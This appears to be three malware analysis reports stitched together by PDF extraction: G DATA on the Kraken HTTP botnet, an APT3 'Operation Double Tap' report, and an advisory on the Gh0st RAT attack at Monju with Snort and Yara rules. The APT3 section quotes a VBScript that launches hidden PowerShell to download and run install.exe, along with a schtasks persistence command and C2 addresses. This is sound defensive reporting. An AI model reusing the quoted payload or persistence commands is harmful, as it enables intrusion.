Infection Vector .
The attacker ( s ) sent a specially crafted email to at least one employee of the attacked enterprise .
The email ’ s body reveals a business-related topic : an offer to become member of this year ’ s International Trade Council .
Nevertheless , the offer is directed at the Philippine National Bank , not the enterprise actually receiving the email .
This could be a trick to make the recipient even more curious to look at the attached document , because he/she received documents not issued for him/her .
The G DATA experts alerted the aeCERT about the incident and their analysis results .
Search Recent entries : 10.04.2015 : Staying alert when buying banners : Google 's advertising service misused for distributing malware 31.03.2015 : IoT : The Internet of Things .
ehm .
Trouble ? ! 16.03.2015 : The Andromeda/Gamarue botnet is on the rise again 06.03.2015 : Casper : the newest member of the cartoon malware family 22.02.2015 : The power of trust : “ Superfish ” case turns into a worst case scenario Category Adware Bots & Botnets CyberCrime eCrime economy Legal issues Exploits Funny findings Web threats Scareware Phishing Security products Vulnerabilities Social engineering Mails Mobile Mobile Social Network Tags 1337 crew adware aldi amtso analysis android android market apple apt authentication autorun av products award badusb banking blog bot botnet bredolab browser brwoser bug carbon caro casino cebit cellphone chat cloud cms cobra coding conference credit card cve cyber espionage cyber espionage ; malware cyper espionage .
targattacks dll dns domain eicar email exploit exploits eyjafjallajoekull facebook fake fake alert fake av false positive fifa firefox fix flame flash fraud ftp gaming google google play hack heartbleed ie iframe im infection injection iot java khobe likejacking link links lizamoon lnk lottery mac mail mails .
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 1 of 7 .
2015-05-08 , 8:46 AM .
In this case , the attachment is a Microsoft Word document which tries to exploit the vulnerability described in CVE-2012-0158 in order to drop and execute malware dubbed “ Kraken HTTP ” .
The G DATA security solutions detect the malicious document ( 08E834B6D4123F0AEA27D042FCEAF992 ) as Exploit . CVE-2012-0158 .AH and G DATA ’ s proactive Exploit Protection technology also prevents the attack before the PC can be infected .
The Malware , advertised on the Underground Market .
“ Kraken HTTP ” is sold on at least one underground market as a commercial product .
Someone , who claims not to be the author of the malware , promoted the malware with a kind of banner which has quite a visual impact .
Have a look at the “ ad ” that was published back in December 2014 .
The banner describes the botnet : its technical features the available commands ( classic ones , such as visiting a website using the infected bot , download and execute a command or a library , update and uninstall ) the plugins one can use : file stealer , ad-clicker , form grabber , … The command “ visiting a website ” using the infected bot could be used by the attackers as an entry point for blackmailing the infected user .
The attackers could visit websites that are regarded as illegal in the respective country and could then ask for ransom and threaten to release information about the alleged violation to any seemingly official entity who would then investigate against the victim .
The flyer also reveals the price of the malware : The basic binary costs $ 320 and each plugin must be paid for separately , for example $ 50 for the file stealer , $ 60 for the ad-clicker and up to $ 350 for a configurable form grabber .
Accepted payment methods are the usual virtual currencies and pre-paid options .
malware malware windows matousec microsoft microsoft windows mobile network news osama bin laden password pdf pharmacy phishing picture pinterest playstation poker pos privacy pup ransom rat removal instructions riskware rsa scan scareware shopping short url snowden socail engineering soccer social engineering social network spain spam spyeye sql stuxnet targattacks testing tool trojan uefa uefa euro 2012 underground update url uroburos usb virus bulletin vulnerabilities warning wifi windows windows 8 wordpress worm youtube zero day zeus zynga 404 419 .
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 2 of 7 .
2015-05-08 , 8:46 AM .
A price list found on a different website , also posted in December 2014 , lists the binary ’ s price as $ 270 and some additional modules , such as a “ Edit Hosts module ” ( $ 15 ) , a “ Botkill module ” ( $ 30 ) and a “ Bitcoin monitor module ” ( $ 20 ) .
Furthermore , “ Kraken HTTP ” is advertised as “ a new , revolutionary botnet [ … ] and very noob-friendly ” .
Noob is a word describing “ that someone is new to a game , concept , or idea ; implying a lack of experience . ” But now let ’ s have a look at what the botnet really is .
Marketing vs .
Reality .
After having a glimpse at the ad designed to promote the malware , we analyzed a sample of it : 3917107778F928A6F65DB34553D5082A , which is detected as Gen : Variant.Zusy.118945 .
We decided to analyze some features mentioned in the flyer and on the other website to evaluate their power and implementation .
Feature : “ Bypass UAC ” As expected , the malware does not really bypass the UAC .
It rather uses a classic trick already used by several malware instances .
It uses a legitimate Microsoft binary in order to execute itself with administrator permissions .
We already presented this technique in our G DATA SecurityBlog article about the Beta Bot .
Feature : “ Anti-VM ” The flyer explains that the botnet won ’ t work in a virtual machine .
To detect whether the malware is running in a virtual machine , the malware author checks if the following directories and the one file exist : C : \Program Files\VMWare\VMware Tools\ C : \Program Files ( x86 ) \VMware\WMware Tools\ C : \WINDOWS\system32\VBoxtray.exe Furthermore , the malware checks if following applications analysts usually use are being executed : Wireshark : a network analyzer Fiddler : a web proxy used to debug HTTP flow .
We can see the tools detection :
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 3 of 7 .
2015-05-08 , 8:46 AM .
If one of the elements mentioned above is detected , the malware will display a rather poetic dialog popup : So , the anti-VM is really rudimentary .
If the additional tools are not installed on the virtual machine the malware can be perfectly executed .
Feature : “ Folder , Bot file & All file dropped are hidden ” The folders & bot files simply have the “ hidden ” attribute set in Microsoft Windows .
If you configure you system to show hidden files and directories , you can perfectly see them :
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 4 of 7 .
2015-05-08 , 8:46 AM .
So , the botnet does not use advanced techniques to hide itself .
Feature : “ Process & registry persistence ” The malware persistence uses a registry key in order to be executed automatically in case the system is rebooted .
The key is HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows : The malware repeatedly checks whether this entry is removed .
In case the entry is removed , the malware will create a new one .
However , instead of removing it , we can simple rename the path to the executable in order to switch off the persistence mechanism .
So , the malware does not have any clever persistence features either .
Feature : “ Path & variable encrypted ” We identified two kinds of “ encrypted ” data :
Some paths are encoded using base64 algorithm , such as : JVdJTkRJUiUA ( % WINDIR % ) and JWFwcGRhdGElaa== ( % appdata % ) Some data is encrypted ( RC4 ) , such as the C & C information :
Feature : “ Bitcoin monitor plugin ” The Bitcoin monitor plugin is even more amusing .
It is not advertised on the flyer but on the other website we found .
The malware monitors the infected user ’ s clipboard .
If the user copies a Bitcoin address to the clipboard , it will be replaced by an address pre-configured by the botmaster .
A Bitcoin address is an identifier of 26-35 alphanumeric characters which represent the owner of a Bitcoin wallet , for example something like .
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 5 of 7 .
2015-05-08 , 8:46 AM .
3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy .
We can easily imagine that the plugin ’ s “ test ” is prone to produce false positives , because any alphanumeric text copied by the user will be automatically changed without reason if it has a length between 26 and 35 characters .
Ok , we admit that the German word “ Kraftfahrzeughaftpflichtversicherung ” ( 36 ) would not be harmed when copied , but what about “ Bundesausbildungsfoerderungsgesetz ” ( 34 ) or “ radioimmunoelectrophoresis ” ( 27 ) ? Just kidding .
But any string , from strong passwords to bank account numbers and more could be affected .
Feature : “ Download & Execute ” , the next Step This feature allows installing further malware on the affected PC in case the attackers decide the current machine is interesting enough .
“ Kraken HTTP ” is only the first stage in this attack and can be seen as reconnaissance tool .
Administration Panel .
The experts of the G DATA SecurityLabs had access to the panel used by “ Kraken HTTP ” but the source code is protected by a commercial packer called IonCube loader .
Nevertheless , we can reveal some screenshots of the administration panel which are available on the underground .
Note that some of the texts contain mistakes :
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 6 of 7 .
2015-05-08 , 8:46 AM .
Conclusion .
We suppose that the Kraken botnet was developed by a beginner .
The malware does not include advanced malware technologies and no groundbreaking innovations , even though those were advertised .
Many sensitive strings are not encrypted , such as installation paths , anti-virus listings , insults against the analysts and much more .
To sell the botnet malware , the author used a quite sexy marketing flyer , but , actually , the malware turned out to be rather simple .
“ Kraken HTTP ” was said to be used during an espionage campaign against the energy sector , especially against targets in the UAE .
We have now identified a specific target from this geographical region and have obtained one of the spear phishing emails used .
Even though the targets that are known by now are rather high-level targets , the malware code as well as its features is not advanced .
We are surprised to see this piece of code has been used carrying out targeted attacks rather than broader criminal activities .
It is not surprising that attackers use vulnerabilities that are older , because , unfortunately , many computers are likely to be still out of date and so the attack works .
Despite the fact that the vulnerability used is not a new one , the malware does not have the common features that we saw during other targeted attack campaigns .
Compared to incidents like Uroburos , the Kraken malware is not good enough to “ catch the big fish ” if we want to stick with to the metaphor .
So , from the current point of view , there are three theories : The attackers who developed the Kraken malware might have chosen to diversify their business and chose to attack special interest targets themselves .
The attackers identified infected machines in the business sector and followed the tracks to see what else they might be able to get from the companies .
The actual espionage team voluntary chose to use a kind of usual and rather simply botnet malware in order to distract analysts from seeing a deeper meaning behind this attack and make them disregard it as ‘ daily cybercrime business ’ .
Attached Files :
kraken_illu_4c.jpg1.9 M kraken_illu_rgb.jpg411 K kraken_illu_web.jpg153 K .
back © 2007 2015 G Data Software AG .
All rights reserved Contact | Imprint .
https : //blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html Page 7 of 7 .
Operation Double Tap .
APT3 ( also known as UPS ) , the actors responsible for Operation Clandestine Fox has quietly continued to send waves of spearphishing messages over the past few months .
This actor initiated their most recent campaign on November 19 , 2014 targeting multiple organizations .
The attacker leveraged multiple exploits , targeting both CVE-2014-6332 and CVE-2014-4113 .
CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability .
CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14 .
The use of CVE-2014-6332 is notable , as it demonstrates that multiple classes of actors , both criminal and APT alike , have now incorporated this exploit into their toolkits .
Further , the use of both of these two known vulnerabilities in tandem is notable for APT3 .
This actor is historically known for leveraging zero day vulnerabilities in widespread but infrequent phishing campaigns .
The use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group .
The Spearphish .
The body of the message is below : One Month 's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000 MODELS Nude Celebrities , Playmates , Cybergirls & More ! Click http://join.playboysplus.com/signup / To Get a Free Plus Member Now & Never Miss Another Update .
Your Member referrals must remain active .
If anyone getting `` Promotion not available '' for 1 month free membership , you might get the issue up to 48 hrs once your membership is expired and make sure to Clear out cookies or use another browser or use another PC .
The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users ’ system to download the below payload :
function runmumaa ( ) On Error Resume Next set shell=createobject ( `` Shell.Application '' ) shell.ShellExecute `` powershell.exe '' , '' -NoLogo NoProfile NonInteractive WindowStyle Hidden ( New-Object “ System.Net.WebClient ” ) .DownloadFile ( “ http://www.playboysplus.com/install/install.exe ” , ” install.exe ” ) ; Invoke-Item install.exe '' , `` `` , `` open '' , 1 end function .
The CVE-2014-6332 exploit code seen in this incident is derived from the code published at http : //www.exploit-db.com/exploits/35230/ , which has also been incorporated in the Metasploit project .
The Downloader .
After the exploit or script executes , the system downloads install.exe , which has the following metadata :
MD5 5a0c4e1925c76a959ab0588f683ab437 Size 46592 bytes Compile Time 2014-11-19 08:55:10Z Import Hash 6b8611f8148a6b51e37fd68e75b6a81c .
The file install.exe attempts to write two files ( doc.exe and test.exe ) to the hard-coded path “ C : \Users\Public ” , which fails on Windows XP because that path is not present by default .
The first dropped file , doc.exe , contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges .
These files have the following metadata :
doc.exe ( x86 ) : MD5 492a839a3bf9c61b7065589a18c5aa8d Size 12288 bytes Import Hash 9342d18e7d315117f23db7553d59a9d1 doc.exe ( x64 ) : MD5 744a17a3bc6dbd535f568ef1e87d8b9a Size 13824 bytes Compile Time 2014-11-19 08:25:45Z Import Hash 2fab77a3ff40e4f6d9b5b7e813c618e4 test.exe : MD5 5c08957f05377004376e6a622406f9aa Size 11264 bytes Compile Time 2014-11-18 10:49:23Z Import Hash f34d5f2d4577ed6d9ceec516c1f5a744 .
These payload files also have interesting PDB debug strings .
install.exe : c : \Users\aa\Documents\Visual Studio 2008\Projects\MShell\Release \MShell.pdb doc.exe : c : \Users\aa\Documents\Visual Studio 2008\Projects\4113\Release \4113.pdb test.exe : C : \Users\aa\Documents\Visual Studio 2010\Projects\MyRat\Client\Client \obj\x86\Release\Client.pdb .
The most interesting PDB string is the “ 4113.pdb , ” which appears to reference CVE-2014-4113 .
This CVE is a local kernel vulnerability that , with successful exploitation , would give any user SYSTEM access on the machine .
The malware component , test.exe , uses the Windows command `` cmd.exe '' /C whoami ” to verify it is running with the elevated privileges of “ System ” and creates persistence by creating the following scheduled task :
schtasks /create /tn `` mysc '' /tr C : \Users\Public\test.exe /sc ONLOGON /ru `` System '' .
When executed , the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913 .
The malware sends the SOCKS5 connection request `` 05 01 00 '' and verifies the server response starts with `` 05 00 '' .
The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command `` 05 01 00 01 c0 b8 3c e5 00 51 '' and verifies that the first two bytes from the server are `` 05 00 '' ( c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order ) .
Once the connection to the server is established , the malware expects a message containing at least three bytes from the server .
These first three bytes are the command identifier .
The following commands are supported by the malware :
Command Description ID 00 00 00 Content after command ID is written to : C : \Users\ [ Username ] \AppData\Local\Temp\notepad1.exe 00 00 01 Deletes the files : C : \Users\ [ Username ] \AppData\Local\Temp\notepad.exe C : \Users\ [ Username ] \AppData\Local\Temp\newnotepad.exe 00 00 02 Malware exits 00 00 03 Malware downloads the URL that follows the command ID .
The file is saved to : C : \Users\ [ Username ] \AppData\Local\Temp\notepad.exe 00 00 04 Content after command ID is written to : C : \Users\ [ Username ] \AppData\Local\Temp\notepad2.exe 00 00 05 The files notepad1.exe and notepad2.exe are concatenated together and written to C : \Users\ [ Username ] \AppData\Local\Temp\newnotepad.exe and executed 00 00 06 The contents of the following file is sent to the server : C : \Users\ [ Username ] \AppData\Local\Temp\note.txt 00 00 07 The string following the command ID is executed using `` cmd /C '' and results are sent to server .
Links to APT3 .
On October 28 , we observed APT3 sending out spearphishing messages containing a compressed executable attachment .
The deflated exe was a variant of the same downloader described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy .
The secondary payload in that case was detected as Backdoor.APT.CookieCutter ( aka Pirpi ) and also named newnotepad.exe ( MD5 8849538ef1c3471640230605c2623c67 ) and connected to the known APT3 domains :
inform.bedircati.com pn.lamb-site.com 210.109.99.64 .
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap.com – another known domain referenced in our Operation Clandestine Fox blog .
DOMAIN FIRST SEEN LAST SEEN IP ADDRESS securitywap.com 2014-11-17 2014-11-20 192.184.60.229 www.securitywap.com 2014-11-17 2014-11-20 192.184.60.229 .
In addition , the join.playboysplus.com exploit and payload delivery site resolves to 104.151.248.173 .
This IP has hosted other domains used by APT3 in past campaigns :
DOMAIN FIRST SEEN LAST SEEN IP ADDRESS join.playboysplus.com 2014-11-21 2014-11-21 104.151.248.173 walterclean.com 2014-11-18 2014-11-20 104.151.248.173 www.walterclean.com 2014-11-18 2014-11-20 104.151.248.173 .
As we discussed in our previous blog detailing previous APT3 activity , the walterclean.com served as a Plugx/Kaba command and control server .
Conclusion .
Although APT3 is well known for employing zero-day exploits in their attacks , recent activity has demonstrated that they will also attack targets with known exploits or social engineering .
Since Operation Clandestine Fox , we have observed this actor execute multiple attacks that did not rely on zero-day exploits .
The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code .
No matter the strategy , this actor has shown an ability to operate successfully .
IOCs for this threat can be found here .
TLP : WHITE Context Threat Intelligence Threat Advisory .
The Monju Incident .
Context Ref .
TA10009 Author Context Threat Intelligence ( CTI ) Date 27/01/2014 Tel +44 ( 0 ) 20 7537 7515 Fax +44 ( 0 ) 20 7537 1071 Email threat @ contextis.co.ukcontextis.co.uk Context Threat Intelligence ( CTI ) Date 27/01/2014 Tel +44 ( 0 ) 20 7537 7515 Fax +44 ( 0 ) 20 7537 1071 Email threat @ contextis.co.uk .
© Context Information Security TLP : WHITE E .
TLP : WHITE .
Contents 1 Distribution 3 2 Executive Summary 4 3 The Monju Incident 5 3.1 Infection Vector 5 3.2 Malware 6 3.2.1 Overview 6 3.2.2 Detection 8 4 Appendix A – File Metadata 9 .
TLP : WHITE Page 2 / 11 .
TLP : WHITE .
1 Distribution .
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting under the Traffic Light Protocol ( TLP ) .
[ 1 ] .
, a method of classifying a document in order to promote the distribution of sensitive information between individuals , organisations or communities in a controlled and trusted way , based on the originator ’ s wishes .
The various levels of the TLP are represented by the following colours :
RED Personal ; for named recipients only .
Sources may use TLP : RED when information can not be effectively acted upon by additional parties , and could lead to impacts on a party 's privacy , reputation , or operations if misused .
Recipients may not share TLP : RED information with any parties outside of the specific exchange , meeting , or conversation in which it is originally disclosed .
TLP : RED information will be passed verbally or in person .
AMBER Limited Distribution .
Sources may use TLP : AMBER when information requires support to be effectively acted upon , but carries risks to privacy , reputation , or operations if shared outside of the organisations involved .
Recipients may only share TLP : AMBER information with members of their own organisation who need to know , and only as widely as necessary to act on that information .
GREEN – Community Wide .
Sources may use TLP : GREEN when information is useful for the awareness of all participating organisations as well as with peers within the broader community or sector .
Recipients may share TLP : GREEN information with peers and partner organisations within their sector or community , but not via publicly accessible channels such as publication or posting publicly on the Internet .
Unlimited Distribution .
Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of misuse , in accordance with applicable rules and procedures for public release .
Subject to standard copyright rules , TLP : WHITE information may be distributed freely , without restriction .
1 http : //www.oecd.org/dataoecd/25/10/40761118.pdf .
TLP : WHITE Page 3 / 11 .
TLP : WHITE .
2 Executive Summary .
On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in Japan noticed suspicious connections emanating from a machine in the control room , coinciding with what was a seemingly routine software update to a free media player .
Among other items , staff training documents and more than 40,000 emails were stored on the machine and thought to be harvested by the attacker .
The Japanese Atomic Energy Agency is investigating further .
The attack appears to have been the result of the attackers having compromised the ‘ GOM Player ’ update server and having it act as a ‘ watering hole ’ , meaning that machines which access the site are delivered malware .
Gom Player originates in South Korea and in some parts of Asia it is a popular alternative to Windows Media Player .
It is unclear whether every machine trying to download an update received this malware or whether only machines which fitted a certain profile were infected .
Technical analysis of the implant on the compromised machine has shown it to be a variant of a Trojan which has been in the wild for some years now and continues to be effective .
The ‘ Gh0st RAT ’ has been used extensively in attacks linked to the Chinese state , though it is important to remember that the code is publicly available and can be modified and used by anyone .
The targeting of a Japanese nuclear facility however , is consistent with Chinese state intelligence requirements .
If this is the work of a Chinese group then we feel the targeting may go much further than the Civil Nuclear sector and thus be of interest to the wider Energy Sector and industry as a whole .
In order to inform the Energy Sector and beyond about this attack , we have compiled a technical summary of the attack and have provided a number of Indicators Of Compromise ( IOCs ) which can be used to aid detection .
It is likely that the attackers would redeploy their implant against other targets , albeit with a delivery mechanism more tailored to the location of the intended victims .
TLP : WHITE Page 4 / 11 .
TLP : WHITE .
3 The Monju Incident .
3.1 Infection Vector .
Based on open source reporting , it appears that the intrusion took place via the compromise of the GOM Player update server ( app.gomlab.com ) , where attackers may have gained entry via a PHP-based webshell , hidden within an image , present on the host since October 2011 .
[ 2 ] .
The observed malicious activity relates to the modification of a file that controls GOM Player updates , spanning the date range 27th December 2013 to 16th January 2014 , during which time these alterations are reported to have only manifested themselves for visitors on certain IP ranges ; evidence supporting this claim has not yet been made public .
If this was indeed the case , then the nature of this attack is certainly more targeted than one that would cover the entire userbase of the GOM Player product , with victims comprising of the Japanese Government in addition to those at the Monju nuclear facility .
The modified file redirected the GOM Player update process to another compromised server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) , where a file containing both the legitimate update and the malware was deliver to the victim .
Modified Update URL app.gomlab.com GOM Player Upd ate Requ est 1 GOM Update 2 Download Request GOM Player and Malware Victim 3 www.fudousankaitori.jp Malware Command And Control Key Compromised Server Attacker Infrastructure testqweasd.tk .
A diagram illustrating the modified flow of the GOM Player update process which led to the compromise .
2 http : //hummingbird.tistory.com/5187 .
TLP : WHITE Page 5 / 11 .
TLP : WHITE .
3.2 Malware .
3.2.1 Overview .
Deployed to the system via a compressed bundle containing the official GOM Player setup binary and a self-extracting RAR archive containing the malicious files , the malware consists of a number of individual pieces .
Upon extraction from the RAR archive , the installer component ( 0ae82fd94836815a1e8d284ccb75109d ) is automatically launched alongside the GOM Player update , distracting victims from the malicious activity taking place .
The installer component is referred to by the author as ‘ miansha ' which , according to an East Asia Cyber Threat Intelligence Researcher , is likely Miǎnshā ( 免杀 ) , a phrase commonly used by People ’ s Republic of China ( PRC ) hackers to mean ‘ anti Antivirus detection ’ or ‘ Antivirus avoidance ’ ; Symantec .
[ 3 ] .
have named the detection for this code ‘ Backdoor.Miancha ’ , where Miǎnchá ( 免查 , likely shorthand for 免杀查 ) similarly means ‘ Antivirus avoidance ’ .
The installer is responsible for the malware persistence mechanism , adding entries to the registry in the following locations , depending on Windows Version :
Miancha Persistence Registry Keys Windows Vista and later HKEY_USERS\.default\Software\Classes\CLSID\{ECD4FC4D-5213-11D0-B792-00A0C90312E1}\InProcServer32\@=expand:"C:\WINDOWS\temp\install.ocx" Prior to Windows Vista HKEY_USERS\.default\Software\Classes\CLSID\{B12AE898-D056-4378-A844-6D393FE37956}\InProcServer32\@=expand:"C:\WINDOWS\temp\install.ocx" .
The installer will also determine the system architecture ( 32 or 64-bit ) and then deobfuscate the relevant loader DLL to the path ‘ C : \Windows\temp\install.ocx ’ , ensuring the malware is launched on system start-up .
Oddly , this file is padded with null bytes , resulting in a 25 megabyte file .
Repackaged Update GoMPLAYERJPSETUP.EXE ( a9225e059d9dace1b259bceec7f48dae ) Real GOM Player Installer Self-extracting RAR Archive containing Malware GOMPLAYERJPSETUP_JP.EXE ( 1ff3b3628e40f0215afacf482ba17782 ) GOMPLAYERBETASETUP_JP.exe ( db79a93448acac8786581858f3edc36a ) Obfuscated Malware Loaders Malicious Installer dll.tmp ( d5548e1913950a42a04debcac4222bd2 ) install.exe ( 0ae82fd94836815a1e8d284ccb75109d ) dll64.tmp ( 01f7b465242237bd3d31d39767aa68e0 ) Obfuscated Implant Code instructions.pdf ( 569071c45f47b7fb7a75f30bc07d5739 ) instructions64.pdf ( 55474f8e26f2b6fc3b5d78ce9a77b0b0 ) The deployment chain of the Miancha Gh0st variant .
3 http : //www.symantec.com/security_response/writeup.jsp ? docid=2014-012407-3922-99 .
TLP : WHITE Page 6 / 11 .
TLP : WHITE .
The main implant code is stored in files named instructions.pdf and instructions64.pdf ; not PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14 , similar to the malware loader DLLs .
The loader , referred to by the malware author as 壳 ( shell ) , reads and deobfuscates the main implant code which then communicates with the attacker-controlled server at testqweasd.tk ( 211.43.220.89 ) on TCP port 443 .
The main implant code is referred to as 白加黑 ( ‘ Black on White ’ ) , a term used in the PRC hacking community to denote the act of Antivirus avoidance through the loading of malicious ‘ black ’ code via non-malicious or trusted ‘ white ‘ code .
This is a practice recently illustrated through the deployment of the PlugX trojan , utilising DLL load order hijacking alongside a signed ( trusted ) executable .
Analysis of this malware revealed it to be a variant of the Gh0st RAT , often used by Chinese actors ( including those who are state-motivated or directly state-sponsored ) .
This specific variant shows similarities to that used during the VOHO campaign .
[ 4 ] .
, where Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies .
Specifically , the initial five bytes of the communications ( often used to denote a campaign or victim ) are ‘ HTTPS ’ , amended from the original ‘ Gh0st ’ ; the same as the traffic produced by the VOHO Gh0st variant .
In addition to delivering system-specific details back to the attacker , Gh0st RAT provides the capability to deploy additional malware , enabling the harvesting of sensitive data and enabling the further propagation throughout the infected network .
4 https : //blogs.rsa.com/voho-apt-campaign-update/ .
TLP : WHITE Page 7 / 11 .
TLP : WHITE .
3.2.2 Detection .
To enable rapid response , the following Snort signature can be deployed :
alert tcp $ HOME_NET any > $ EXTERNAL_NET 53,80,443,1080 ( msg : '' gh0st RAT 'HTTPS ' variant ( aka Backdoor.Miancha ) '' ; flow : established , to_server ; content : '' HTTPS '' ; depth:5 ; rawbytes ; classtype : trojan-activity ; sid : xxx ; rev:1 ; ) .
Additionally , the following Yara signature should identify both encoded payloads and the active implant in memory :
rule Trojan_W32_Gh0stMiancha_1_0_0 { strings : $ 0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19 1e 5c 7b 67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a 60 71 7a 60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b 7a 7a 71 77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39 78 71 7a 73 60 7c 2e 34 24 19 1e 19 1e } $ 1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c } $ 1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 } $ 2 = `` DllCanLoadNow '' $ 2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 } $ 3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 } $ 4 = `` JXNcc2hlbGxcb3Blblxjb21tYW5k '' $ 4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26 25 60 4d 43 21 7f } $ 5 = `` SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA== '' $ 5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52 46 5e 40 24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e 4e 4c 5a 6e 76 27 5e 77 59 55 29 29 } $ 6 = `` C : \\Users\\why\\ '' $ 6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 } $ 7 = `` g : \\ykcx\\ '' $ 7x = { 73 2E 48 6D 7F 77 6C 48 } $ 8 = `` ( miansha ) '' $ 8x = { 3C 79 7D 75 7A 67 7C 75 3D } $ 9 = `` server ( \xE5\xA3\xB3 ) '' $ 9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1 B7 A7 3D 48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 } $ cfgDecode = { 8a ? ? ? ? 80 c2 7a 80 f2 19 88 ? ? ? ? 41 3b ce 7c ? ? } condition : any of them } .
TLP : WHITE Page 8 / 11 .
TLP : WHITE .
4 Appendix A – File Metadata .
Gh0stMiancha Installer MD5 0ae82fd94836815a1e8d284ccb75109d SHA1 bcba2a4d55d860f0bca3b9f80a5deb2dd69f000c SHA256 b2f9e2f7c07235a6ea03e90ba591f0a43d38d8ff8ee6583473b6fbb63831619d Size ( bytes ) 13314 Compile Time 2013-11-22 12:19:48 UTC In-the-wild Filenames install.exe PDB String g : \ykcx\install ( miansha ) \Release\install.pdb .
Obfuscated TrojanLoader : W32/Gh0stMiancha MD5 d5548e1913950a42a04debcac4222bd2 SHA1 ac48bc2deefd30dad762a23e85409a7eec48b723 SHA256 3d43f7fab3c8f574e2790c2d97f85fa87f0d53e412c995462e53348b4fc34b74 Size ( bytes ) 10299 Compile Time N/A In-the-wild Filenames dll.tmp .
TrojanLoader : W32/Gh0stMiancha MD5 04e7361323b431f7c9f86388f316bbea SHA1 e3c095c7ace563b41b3f4310f3de69e47c86fd03 SHA256 73ef70f1e80e32341eebcb3b1084cf896f6b1aa701b7a6c7abcb9293500d84ae Size ( bytes ) 10299 Compile Time 2013-11-26 09:34:10 UTC In-the-wild Filenames install.ocx PDB String h : \2013.11.25\server ( 壳 ) \Release\server.pdb .
Obfuscated TrojanLoader : W64/Gh0stMiancha MD5 01f7b465242237bd3d31d39767aa68e0 SHA1 db4ec59bf7f34a21f9dc7f2ded68c616f7c0fe47 SHA256 ed39c1d86ff8cfe18ef58e850d205a678d255150324b00661b91448173c94900 Size ( bytes ) 12347 Compile Time N/A In-the-wild Filenames dll64.tmp .
TrojanLoader : W64/Gh0stMiancha MD5 008fbd0fde06edb31fc7eecdae1a3030 SHA1 b9ae0a079cd1dae96425ced4bb96ba0f71c87a7a .
TLP : WHITE Page 9/ 11 .
TLP : WHITE .
SHA256 cc8d38d3cc214ff3ad10d6859a88e018b1f7e0ed6df7d04a6f4368bda851ba14 Size ( bytes ) 12347 Compile Time 2013-11-26 11:47:39 UTC In-the-wild Filenames install.ocx PDB String C : \Users\why\Desktop\server ( 壳 ) \x64\Release\server.pdb .
Obfuscated Trojan : W32/Gh0stMiancha MD5 569071c45f47b7fb7a75f30bc07d5739 SHA1 540bb9d2dee8f4e10e5ae0a5cc900b346a57a198 SHA256 8a00b2aefdcd0bb22013bbe9c7941fa16af8246e545e1522622006b9c88ca716 Size ( bytes ) 169019 Compile Time N/A In-the-wild Filenames instructions.pdf .
Trojan : W32/Gh0stMiancha MD5 916b1a07efb145c450b4c13540be6c3e SHA1 7984639beb4e9870301d3b44a68b4346f9a6b826 SHA256 f26c2e9bee680f8e4d7afd73e2984a6697263334d2f0049a40e050d75293035e Size ( bytes ) 169019 Compile Time 2013-12-06 08:08:28 UTC In-the-wild Filenames N/A PDB String h : \2013.11.25\白加黑\server ( update.dll ) ( instructions.pdf ) \Release\server.pdb .
Obfuscated Trojan : W64/Gh0stMiancha MD5 55474f8e26f2b6fc3b5d78ce9a77b0b0 SHA1 3f714c33992e906e69df2d5d4971beaed336d9f4 SHA256 27e5670f68ff68acc80716c6870f4e5d06c471791f087d5b9b7613f8dc700037 Size ( bytes ) 233019 Compile Time N/A In-the-wild Filenames instructions64.pdf .
